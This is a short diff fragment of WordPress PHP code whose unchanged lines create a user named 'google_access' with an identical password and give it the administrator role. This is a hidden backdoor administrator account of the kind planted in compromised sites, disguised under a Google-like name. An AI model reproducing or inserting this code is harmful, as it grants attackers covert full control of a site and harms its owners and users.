@@ -1,3 +1,4 @@
+
 $new_user =new WP_User(wp_create_user('google_access','google_access'));
 $new_user->set_role('administrator');
 
